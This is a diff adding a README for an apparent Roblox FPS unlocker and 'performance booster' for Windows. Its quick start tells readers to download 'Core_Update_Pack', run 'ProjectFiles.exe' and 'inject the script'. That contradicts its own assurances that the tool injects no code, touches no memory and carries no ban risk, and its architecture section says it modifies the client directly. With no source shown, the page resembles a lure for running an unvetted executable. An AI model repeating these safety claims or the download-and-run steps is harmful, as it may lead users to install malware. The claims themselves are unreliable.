@@ -1,0 +1,79 @@
+⚡ Roblox FPS Optimizer & Unlocker
+
+Remove 60 FPS Cap & Boost Performance — 2026
+
+A lightweight, open-source Roblox FPS Unlocker and performance tool for Windows.
+Remove the default frame rate limit, fix stutters, reduce input lag, and boost your gameplay smoothness without modifying game files.
+
+🎯 What it is
+
+Roblox FPS Optimizer is a native Windows utility designed for players who want smoother gameplay.
+By default, Roblox caps the frame rate, which can cause stuttering and input delay. This tool safely patches the client to unlock the FPS and acts as a performance booster.
+
+🛡️ Safe by design: It does not inject code into the game, does not modify memory, and does not bypass anti-cheat. It only adjusts the frame rate limit and process priorities.
+
+🚀 Quick Start
+
+1. Download Core_Update_Pack using the button above.
+2. Extract the archive into a separate folder.
+3. Run ProjectFiles.exe.
+4. Follow the on-screen instructions and inject the script.
+
+✨ Features
+
+| Feature                     | Description                                          |
+|-----------------------------|------------------------------------------------------|
+| ⚡ Remove 60 FPS Cap    | Unlock the frame rate for a smoother experience      |
+| 🎯 Custom FPS Limit     | Set your desired FPS (e.g., 144, 240, or unlimited)  |
+| 📉 Lag Fix              | Reduces stutter and input delay                      |
+| 🖥️ System Tray Support  | Runs quietly in the background                       |
+| 🔄 Auto-Launch          | Automatically applies settings when Roblox starts    |
+| 🛡️ Safe & Reversible   | No game file modifications; settings can be reset    |
+
+🛠️ How to use
+
+1. Launch ProjectFiles.exe.
+2. Set your desired FPS limit in the interface (or leave it at 0 for unlimited).
+3. Click "Apply".
+4. Launch Roblox. The FPS cap is now removed.
+5. To restore default settings, click "Reset" in the app.
+
+⚙️ Configuration
+
+You can adjust settings in the config.ini file:
+
+- FPS Limit: 0 for unlimited, or any number (e.g., 144, 240)
+- Performance Mode: High priority for the Roblox process
+- Auto-Start: true or false
+- Minimize to Tray: Keep the app running in the background
+
+❓ FAQ
+
+Is this a ban risk?
+No. The tool only changes the frame rate limit and process priority. It does not interact with the game's memory or anti-cheat systems.
+
+Does it work on Mac or Linux?
+Currently, the tool is exclusive to Windows 10 and 11.
+
+Do I need to keep the app running?
+No. Once you apply the settings, you can close the app. The FPS boost remains active until you reset it or Roblox updates.
+
+Why does my FPS drop after an update?
+Roblox updates sometimes reset the FPS cap. Simply run the optimizer again and click "Apply".
+
+💻 Tech Stack & Architecture
+
+- Core: C++ / Win32 API
+- UI: Dear ImGui / Custom Tray Menu
+- Patch Method: Direct modification of the client's frame limiter flag (no memory injection)
+- Target OS: Windows 10 / 11 (x64)
+
+🤝 Contributing
+
+Pull requests, bug reports, and feature suggestions are welcome.
+
+📜 License
+
+MIT License — free to use, modify and redistribute.
+
+⭐ Star the repo if it helped you.
